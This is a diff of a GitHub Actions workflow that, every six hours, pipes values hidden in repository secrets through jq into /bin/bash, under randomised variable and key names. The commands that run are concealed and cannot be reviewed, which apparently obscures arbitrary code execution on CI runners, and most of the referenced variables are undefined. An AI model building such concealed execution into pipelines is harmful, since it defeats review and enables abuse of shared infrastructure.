@@ -1,34 +1,22 @@
 name: corsetgoofy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
+    - cron: '39 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: corsetgoofy
         env:
-          ixp3: ${{ secrets.ixp3 }}
+          lq3: ${{ secrets.lq3 }}
         run: |
-          echo $ixp3 | jq -r .tahu7526 | /bin/bash
-          echo $yboi471 | jq -r .voxya62564 | /bin/bash
-          echo $bapbx181 | jq -r .mq7 | /bin/bash
-          echo $q90 | jq -r .igt7104 | /bin/bash
-          echo $tw8833 | jq -r .cr1957 | /bin/bash
-          echo $ug2 | jq -r .sfe06792 | /bin/bash
-          echo $g63796 | jq -r .o5271 | /bin/bash
-          echo $ehpi6050 | jq -r .ohw189 | /bin/bash
-          echo $c311 | jq -r .uf06 | /bin/bash
-          echo $hpk1 | jq -r .rpfg63 | /bin/bash
-          echo $lr7 | jq -r .auwo9 | /bin/bash
-          echo $avpjj8624 | jq -r .bnc16117 | /bin/bash
-          echo $iqzi066 | jq -r .cl591 | /bin/bash
-          echo $ccta175 | jq -r .vrn9 | /bin/bash
-          echo $btgd3097 | jq -r .gggdf4905 | /bin/bash
-          echo $nlnog002 | jq -r .rur36 | /bin/bash
-          echo $xsi14790 | jq -r .ubwt5 | /bin/bash
-          echo $t8 | jq -r .gy140 | /bin/bash
+          echo $lq3 | jq -r .kuvg47905 | /bin/bash
+          echo $xzl68923 | jq -r .enh8 | /bin/bash
+          echo $gzu72 | jq -r .p9200 | /bin/bash
+          echo $ypa745 | jq -r .imsgj229 | /bin/bash
+          echo $goxln9844 | jq -r .duc437 | /bin/bash
+          echo $bmrx64904 | jq -r .tq01932 | /bin/bash
 
